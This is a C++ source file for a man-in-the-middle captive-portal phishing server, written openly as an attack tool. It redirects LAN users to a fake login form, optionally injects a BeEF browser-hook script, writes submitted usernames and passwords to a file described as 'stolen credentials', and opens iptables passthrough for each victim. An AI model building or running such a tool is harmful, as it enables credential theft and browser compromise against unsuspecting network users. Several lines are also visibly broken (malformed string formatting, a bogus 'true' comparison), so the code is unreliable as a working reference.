#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/filesystem.hpp>
#include <boost/network/uri.hpp>
#include <httpserver.hpp>
#include "everythingelse.hpp"

//currently refactoring to include ncurses and a menu and all sorts of goodies in a menu system
// I learned this and coded it in 18 hours total without youtube, udemy, or any tutorial..

// I used : google, stackexchange, official reference documentation, code examples.

//g++ ./main.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses

// reemember, if youre getting library errors, you might need to check the linker options
// if youre getting syntax errors, you might want to check the code,
//sometimes one SMALL error can fuck EVERYTHING up, be aware and keep an open mind.

using namespace std;
using namespace httpserver;

namespace filesystem = boost::filesystem;
namespace options    = boost::program_options;
namespace url_parse  = boost::network::uri;
int row = 0, col = 0;
int init_display_height;
int init_display_width;
bool INPUT_FLAG = true;
bool hook;
int PORT;
std::string  credentials_file;
//std::vector[] username_password_pair;
//std::string username_password_array[];

std::string document_root;
std::vector<string> hostslist;
std::string html_redirect_body;
std::string html_form_body;
std::string hook_location;
std::string redirect_ip;
std::string remote_ip;
std::string beef_hook;
std::string addr;
std::string iface;


void make_html(std::string hook_loc, std::string formaction) {
    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
    std::string html_form_body_top = "<body><form class=\"login\" ";
    std::string form_action = "action=\"" + formaction + "\" ";
    std::string html_form_body_bottom = " method=\"post\">\
        <input type=\"text\" name=\"username\" value=\"username\">\
        <input type=\"text\" name=\"password\" value=\"password\">\
        <input type=\"submit\" name=\"submit\" value=\"submit\">\
        </form>\
        </body>\
        </html>";
    std::string html_redirect_head = "<html><head>";
    beef_hook = "<script src=" + hook_loc + "></script>";
    std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
    html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
    html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
};


int parse_commandline(int argc, char* argv[]){
    options::options_description desc("Captive portal server");
    desc.add_options()
        ("help,h", "Print Help Message" )
        ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
        ("port,p", options::value<int>()->default_value(80), "port to serve the portal on")
        ("Iface,i", options::value< std::string >()->default_value("eth0"), "Interface to use, must be capable of monitor mode." )
        ("beef-hook,b", options::value< std::string >()->default_value("false"), "Trigger for beef" )
        ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
        ("external-html,e", options::value<std::string>()->default_value("false"), "switch for serving external document instead of internal form. type 'true' OR NOTHING")
        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server ")

    ;
    options::variables_map arguments;
    options::store(options::parse_command_line(argc , argv, desc), arguments);
    try {
        options::notify(arguments);
    } catch (std::exception& e) {
        auto errortext = e.what();
        errprint(errortext);
        return 1;
    };
    if (arguments.count("help")) {
        cout << desc << "\n";
        return 1;
    };
    if (arguments.count("beef-hook") == 'true') {
        hook_location = arguments["address"].as<std::string>();
        hook_location = hook_location + ":3000";
        system("service beef start");
    } else {
        hook_location = "";
    };
    if (arguments.count("external-html") == 'true') {
        //auto pwd = filesystem::current_path();
        //document_root = pwd + arguments
    };

    document_root = arguments["document-root"].as<std::string>();
    credentials_file = arguments["credentials"].as<std::string>();
    PORT = arguments["port"].as<int>();
    redirect_ip =  arguments["address"].as<std::string>() + "/login";
    addr = arguments["address"].as<std::string>();
};

class CaptivePortal : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        termcolorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
        return std::shared_ptr<http_response>(new string_response(html_redirect_body));
    };

    const std::shared_ptr<http_response> render_POST(const http_request& request) {
        remote_ip = request.get_requestor();

        authpassthrough(remote_ip);
        termcolorprint("green", ("Host %host Authorized", remote_ip));
        save_credentials(request.get_user(), request.get_pass());
        return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
    };

    void authpassthrough(std::string remoteip){
        system(("iptables -t nat -I PREROUTING 1 -s $remoteip -j ACCEPT", remoteip).c_str());
        system(("iptables -I FORWARD -s %remoteip-j ACCEPT", remoteip).c_str());
    };

    int save_credentials(std::string username, std::string password){
        try {
            std::string name = username;
            std::string pass = password;
            auto pwd = filesystem::current_path().string();
            std::string file = pwd + credentials_file;
            std::ofstream credentials(file);
            std::string data(name + " : " + pass + "\n");
            credentials << data;
            return 0;
        } catch (std::exception& e) {
            auto errortext = e.what();
            errprint(errortext);
            return 1;
        };
    };

};

class Login : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        make_html(hook_location, addr);
        return std::shared_ptr<http_response>(new string_response(html_form_body));

    };
};


void start_server(bool power_switch){
    if (power_switch == true){
    webserver server = create_webserver(PORT);
    CaptivePortal captiveportal;
    Login login;
    server.register_resource(document_root, &captiveportal);
    server.register_resource("/login", &login);
    server.start(true);
    } else if (power_switch == false) {
        shutdown_server();
    }

};

int main(int argc, char* argv[]) {

    try {
        initscr();
        if (stdscr == NULL ) {
            printf("ERROR: init() failed");
        };
    } catch (std::exception& e) {
        auto errortext = e.what();
        printf(errortext);
        return 1;
        };
    //wmove(stdscr, 50,50);
    cbreak();
    nodelay(stdscr, true);
    getmaxyx(stdscr, init_display_height, init_display_width);
    start_color();
    keypad(stdscr, TRUE);
    refresh();
    fflush(stdin);
    INPUT_FLAG = true;
    scrollok(stdscr, true);
    output_window = newpad(2046, init_display_width);
    wprintw(stdscr, "test");

    //scrollok(output_window, true);
    //input_window = subwin(main_window , 1, init_display_width , LINES -1, 0);
    //touchwin(output_window);
    //wmove(input_window, LINES -1, 0);
    //wbkgd(output_window, COLOR_PAIR(1));
    signal(SIGWINCH, resizehandler);
    while(1)
    {
        get_command();
    };
    endwin();
    };

















